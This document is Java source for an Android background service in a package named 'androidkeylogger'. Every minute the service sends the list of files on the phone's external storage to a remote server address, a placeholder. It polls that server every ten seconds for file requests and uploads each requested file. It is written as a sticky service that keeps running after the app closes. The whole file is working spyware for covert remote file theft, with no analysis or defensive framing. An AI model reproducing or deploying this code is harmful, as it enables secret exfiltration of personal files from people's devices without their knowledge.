package com.bshu2.androidkeylogger;

import android.app.*;
import android.content.Intent;
import android.os.*;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class FileAccessService extends Service {
    private static final String CHANNEL_ID = "RemoteAccessChannel";
    private static final String SERVER_URL = "https://yourserver.com/server.php";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());

        new Thread(this::sendFileList).start();
        new Thread(this::checkForDownloadRequests).start();
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Remote Access Service")
                .setContentText("Running in background")
                .setSmallIcon(R.drawable.ic_notification)  // Add an icon in res/drawable
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID, "Remote Access Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private void sendFileList() {
        while (true) {
            try {
                File directory = Environment.getExternalStorageDirectory();
                File[] files = directory.listFiles();
                if (files == null) return;

                JSONArray fileList = new JSONArray();
                for (File file : files) {
                    if (file.isFile()) fileList.put(file.getName());
                }

                HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);

                String payload = "file_list=" + fileList.toString();
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes("UTF-8"));
                    os.flush();
                }

                Log.d("FileAccessService", "Sent file list to server.");
                Thread.sleep(60000);  // Send file list every 1 minute
            } catch (Exception e) {
                Log.e("FileAccessService", "Error sending file list", e);
            }
        }
    }

    private void checkForDownloadRequests() {
        while (true) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL + "?get_request=1").openConnection();
                conn.setRequestMethod("GET");

                Scanner scanner = new Scanner(conn.getInputStream());
                if (scanner.hasNext()) {
                    JSONObject response = new JSONObject(scanner.nextLine());
                    if (response.has("file_request")) {
                        String requestedFile = response.getString("file_request");
                        uploadFile(requestedFile);
                    }
                }
                scanner.close();

                Thread.sleep(10000);  // Check every 10 seconds
            } catch (Exception e) {
                Log.e("FileAccessService", "Error checking download requests", e);
            }
        }
    }

    private void uploadFile(String fileName) {
        try {
            File file = new File(Environment.getExternalStorageDirectory(), fileName);
            if (!file.exists()) {
                Log.e("FileAccessService", "File not found: " + fileName);
                return;
            }

            HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=*****");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(("--*****\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n\r\n").getBytes());
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                    }
                }
                os.write("\r\n--*****--\r\n".getBytes());
                os.flush();
            }

            Log.d("FileAccessService", "Uploaded file: " + fileName);
        } catch (Exception e) {
            Log.e("FileAccessService", "Error uploading file", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Keep service running even if the app is closed
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
